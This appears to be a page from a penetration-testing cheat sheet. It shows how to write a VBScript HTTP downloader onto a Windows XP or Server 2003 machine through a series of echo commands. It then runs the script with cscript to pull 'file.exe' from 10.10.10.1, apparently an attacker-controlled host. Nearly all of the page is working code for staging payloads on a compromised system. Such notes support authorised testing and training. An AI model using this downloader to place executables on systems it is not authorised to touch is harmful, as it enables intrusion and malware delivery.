# VBScript

&#x20;VBScript can be leveraged in Windows XP, Server 2003

#### Sample HTTP Downloader

```
echo strUrl = WScript.Arguments.Item(0) > downloader.vbs
echo StrFile = WScript.Arguments.Item(1) >> downloader.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> downloader.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> downloader.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> downloader.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> downloader.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> downloader.vbs
echo  Err.Clear >> downloader.vbs
echo  Set http = Nothing >> downloader.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> downloader.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> downloader.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> downloader.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> downloader.vbs
echo  http.Open "GET", strURL, False >> downloader.vbs
echo  http.Send >> downloader.vbs
echo  varByteArray = http.ResponseBody >> downloader.vbs
echo  Set http = Nothing >> downloader.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> downloader.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> downloader.vbs
echo  strData = "" >> downloader.vbs
echo  strBuffer = "" >> downloader.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> downloader.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> downloader.vbs
echo  Next >> downloader.vbs
echo  ts.Close >> downloader.vbs
```

#### Run with cscript

```
C:\Temp> cscript downloader.vbs http://10.10.10.1/file.exe file.exe
```

